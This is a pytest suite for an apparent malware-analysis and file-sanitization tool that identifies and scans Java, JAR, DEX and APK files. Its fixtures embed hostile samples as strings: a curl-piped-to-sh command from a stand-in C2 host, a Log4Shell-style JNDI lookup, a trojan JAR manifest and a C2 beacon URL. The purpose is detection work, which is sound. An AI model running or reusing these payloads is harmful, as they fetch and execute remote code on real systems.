"""
Unit tests for Android APK & Dalvik DEX analysis, Java source/bytecode/JAR analysis,
identification disambiguation, and sanitization (CDR).
"""

import io
import struct
import zipfile
import pytest
from pathlib import Path

from app.analyzers.identification import IdentificationAnalyzer
from app.analyzers.apk_analyzer import ApkAnalyzer, AxmlDecoder, DexParser
from app.analyzers.java_analyzer import JavaAnalyzer, JavaClassParser
from app.sanitizers.apk_sanitizer import ApkSanitizer
from app.sanitizers.java_sanitizer import JavaSanitizer
from app.sanitizers.base import SanitizationOptions


def test_java_and_dex_identification(tmp_path: Path):
    """Verify identification correctly classifies Java source, class, jar, dex, and apk."""
    ident = IdentificationAnalyzer()

    # 1. Java Source (.java)
    java_file = tmp_path / "Payload.java"
    java_file.write_text("public class Payload { public static void main(String[] args) {} }")
    res_java = ident.analyze(java_file, "Payload.java", "text/plain")
    assert res_java.data["category"] == "java"
    assert "java" in (res_java.data.get("detected_mime") or "").lower()

    # 2. Java Compiled Bytecode (.class) - 0xCAFEBABE with Java version 52 (Java 8)
    class_bytes = struct.pack(">IHH", 0xCAFEBABE, 0, 52) + b"\x00" * 20
    class_file = tmp_path / "Payload.class"
    class_file.write_bytes(class_bytes)
    res_class = ident.analyze(class_file, "Payload.class", "application/octet-stream")
    assert res_class.data["category"] == "java"
    assert res_class.data.get("detected_mime") == "application/x-java-class"

    # 3. Dalvik Executable (.dex) - dex\n035\x00
    dex_bytes = b"dex\n035\x00" + b"\x00" * 100
    dex_file = tmp_path / "classes.dex"
    dex_file.write_bytes(dex_bytes)
    res_dex = ident.analyze(dex_file, "classes.dex", "application/octet-stream")
    assert res_dex.data["category"] == "apk"
    assert res_dex.data.get("detected_mime") == "application/x-dex"

    # 4. APK package (.apk) - ZIP with AndroidManifest.xml
    apk_file = tmp_path / "testapp.apk"
    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00" + b"\x00" * 40)
        zf.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 40)
    res_apk = ident.analyze(apk_file, "testapp.apk", "application/octet-stream")
    assert res_apk.data["category"] == "apk"
    assert res_apk.data.get("detected_mime") == "application/vnd.android.package-archive"

    # 5. JAR archive (.jar) - ZIP with META-INF/MANIFEST.MF
    jar_file = tmp_path / "app.jar"
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\r\nMain-Class: com.example.App\r\n")
    res_jar = ident.analyze(jar_file, "app.jar", "application/octet-stream")
    assert res_jar.data["category"] == "java"
    assert res_jar.data.get("detected_mime") == "application/java-archive"


def test_java_source_analysis(tmp_path: Path):
    """Test Java source analyzer on malicious execution vectors."""
    source_code = """
    package com.malicious.payload;
    import java.lang.reflect.Method;
    import sun.misc.Unsafe;

    public class Exploit {
        public static void main(String[] args) throws Exception {
            // Shell command execution
            Runtime.getRuntime().exec("curl -s http://c2.evil.com/drop.sh | sh");
            ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", "whoami");
            
            // JNDI Log4Shell lookup
            new javax.naming.InitialContext().lookup("ldap://evil-ldap.com:1389/Exploit");
            
            // Dynamic Reflection
            Class<?> clazz = Class.forName("com.secret.Payload");
            Method m = clazz.getMethod("execute");
            m.invoke(null);
        }
    }
    """
    java_file = tmp_path / "Exploit.java"
    java_file.write_text(source_code)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(java_file, "Exploit.java", "text/x-java-source")
    assert res.success is True
    data = res.data
    assert data["is_java"] is True
    assert data["java_subtype"] == "source"
    assert len(data["dangerous_apis"]) >= 4

    api_titles = [a["title"] for a in data["dangerous_apis"]]
    assert any("Shell Command Execution" in t for t in api_titles)
    assert any("Subprocess Creation" in t for t in api_titles)
    assert any("Remote JNDI" in t for t in api_titles)
    assert any("Reflection" in t for t in api_titles)

    # Check extracted URLs
    assert any("c2.evil.com" in u for u in data["iocs"]["urls"])
    assert data["risk_score"] >= 60
    assert data["risk_level"] in ("HIGH", "CRITICAL")


def test_jar_archive_analysis(tmp_path: Path):
    """Test JAR archive analyzer detecting Main-Class, Premain Java Agent, all-permissions, and embedded binaries."""
    jar_file = tmp_path / "agent_trojan.jar"
    manifest_content = (
        "Manifest-Version: 1.0\r\n"
        "Main-Class: com.rat.BotClient\r\n"
        "Premain-Class: com.rat.AgentHook\r\n"
        "Permissions: all-permissions\r\n"
        "\r\n"
    )
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_content)
        zf.writestr("com/rat/BotClient.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34Runtime.getRuntime().exec")
        zf.writestr("com/rat/AgentHook.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34sun/misc/Unsafe")
        zf.writestr("lib/win32/payload.dll", b"MZ\x90\x00" + b"\x00" * 100)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "agent_trojan.jar", "application/java-archive")
    assert res.success is True
    data = res.data
    assert data["java_subtype"] == "jar"
    assert data["main_class"] == "com.rat.BotClient"
    assert data["premain_class"] == "com.rat.AgentHook"
    assert data["permissions"] == "all-permissions"
    assert len(data["embedded_binaries"]) == 1
    assert "payload.dll" in data["embedded_binaries"][0]

    findings_titles = [f.title for f in res.findings]
    assert any("Premain-Class" in t for t in findings_titles)
    assert any("all-permissions" in t for t in findings_titles)
    assert any("Embedded Native Binaries" in t for t in findings_titles)


def test_standalone_dex_analysis(tmp_path: Path):
    """Test Dalvik Executable (.dex) string table and API detection."""
    # Build minimal valid DEX header
    dex_buf = bytearray(112)
    dex_buf[0:8] = b"dex\n035\x00"
    dex_buf[32:36] = struct.pack("<I", 112)  # file_size = 112
    dex_buf[36:40] = struct.pack("<I", 112)  # header_size = 112
    dex_buf[40:44] = struct.pack("<I", 0x12345678)  # endian_tag

    # Append string containing suspicious API call and C2 URL
    test_str = b"Landroid/telephony/SmsManager;->sendTextMessage https://c2.botnet.cc/beacon"
    dex_buf.extend(test_str)

    dex_file = tmp_path / "classes.dex"
    dex_file.write_bytes(dex_buf)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(dex_file, "classes.dex", "application/x-dex")
    assert res.success is True
    data = res.data
    assert data["is_standalone_dex"] is True
    assert any("SmsManager" in api["api"] for api in data["dex_info"]["detected_apis"])
    assert any("c2.botnet.cc" in u for u in data["iocs"]["urls"])


def test_apk_and_java_sanitizer(tmp_path: Path):
    """Test CDR sanitizers for APK and Java."""
    apk_sanitizer = ApkSanitizer()
    java_sanitizer = JavaSanitizer()

    # 1. APK PDF Dossier Generation
    apk_in = tmp_path / "app.apk"
    apk_in.write_bytes(b"PK\x03\x04" + b"\x00" * 100)
    apk_out = tmp_path / "app_sanitized.pdf"
    apk_opts = SanitizationOptions(convert_to_pdf=True)

    apk_res = apk_sanitizer.sanitize(apk_in, apk_out, apk_opts, original_filename="app.apk")
    assert apk_res.success is True
    assert apk_out.exists()
    assert apk_out.stat().st_size > 0
    # PDF magic
    assert apk_out.read_bytes()[:4] == b"%PDF"

    # 2. Java Source Sanitization (Disarm & Header)
    java_in = tmp_path / "Malicious.java"
    java_in.write_text('Runtime.getRuntime().exec("whoami"); ProcessBuilder pb = new ProcessBuilder();')
    java_out = tmp_path / "Malicious_clean.java"
    java_opts = SanitizationOptions(convert_to_pdf=False)

    j_res = java_sanitizer.sanitize(java_in, java_out, java_opts, original_filename="Malicious.java")
    assert j_res.success is True
    clean_code = java_out.read_text()
    assert "/* [FILESANITIZER_DISARMED_EXECUTION] */" in clean_code
    assert "Runtime.getRuntime().exec" not in clean_code

    # 3. Java PDF Review Dossier
    java_pdf_out = tmp_path / "Malicious.pdf"
    j_pdf_res = java_sanitizer.sanitize(java_in, java_pdf_out, SanitizationOptions(convert_to_pdf=True))
    assert j_pdf_res.success is True
    assert java_pdf_out.exists()
    assert java_pdf_out.read_bytes()[:4] == b"%PDF"
